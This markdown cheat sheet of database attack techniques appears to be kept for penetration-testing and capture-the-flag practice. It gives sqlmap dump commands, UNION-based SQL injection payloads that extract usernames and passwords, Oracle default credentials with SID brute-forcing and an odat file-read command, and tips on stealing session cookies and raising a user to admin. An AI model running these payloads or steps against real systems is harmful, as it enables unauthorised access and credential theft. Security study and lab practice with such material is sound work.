# Databases (SQL / NoSQL)
## Tips
- If a database has a table of session one can try to steal cookies or other credentials from the table to authenticate as another user.     
- If one is in a database with write access and there are roles assigned to users, give the current user admin rights.

# SQL injection cheat sheets
- [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


# sqlmap
## GET
Discover vulnerabilities in databases as well as dump info
```sh
sqlmap.py -u <URL> --batch
```

### POST
Can use log of a POST request, to search and enumerate a database
```sh
sqlmap -r <request_file> --level 5 --risk 3 --batch --string "Wrong identification" --dump
```

### Request file
Use burp as that will give you the full request, however it can be done via chrome network tab with a bit of editing.     
If the latter is chosen please follow

**BASE**
```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en,en-US;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Host: target.com
Origin: http://target.com
Referer: http://target.com/login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
```

**EDITED**
```
POST /login.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en,en-US;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Host: target.com
Origin: http://target.com
Referer: http://target.com/login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36

username=name&password=password
```

#### References
- [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html)

# SQL injection UNION attack

## Steps
```sql
"test' union select 'table',database(),'C'-- "
"test' union select 'table',username, password from db.table -- -"
```

## Articles to reproduce the attack
- [https://pentest-tools.com/blog/sql-injection-attacks](https://pentest-tools.com/blog/sql-injection-attacks)
- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
​​
​
## MSSQL union queries
Test the following query, it should dump all the data from the selected table.         
```sql
abcd' union select 1, concat(<data>,':',<data>) 3,4,5,6 from <table>;-- -
```      

*If the query needs to be edited, please follow the link in [the references](#references-1)* below.

### References
- [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)

# MySQL user defined functions
[​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf](​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)

​
# Oracle / ODAT
Use [this](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) link as a reference for the steps described below    
[https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)    

## Basic creds 
``` 
Username --> Scott 
Password --> tiger
```

## Brute force SID
*Steps*    
1. Use: `odat` and its `sidguesser` to bruteforce with a link provided
2. Use metasploit and use `auxiliary(admin/oracle/sid_brute)`
3. Use `sqlplus` to login with the creds or
    1. Read file with odat as such:    `odat ctxsys -s 10.10.10.14 -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt`


# NoSQL
NoSQL injection knowledge base
A well curated list of tools and injection methods to use on NoSQL databases by ​[swisskyrepo](https://github.com/swisskyrepo)
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

​
# NoSQLMap
[https://github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)
​​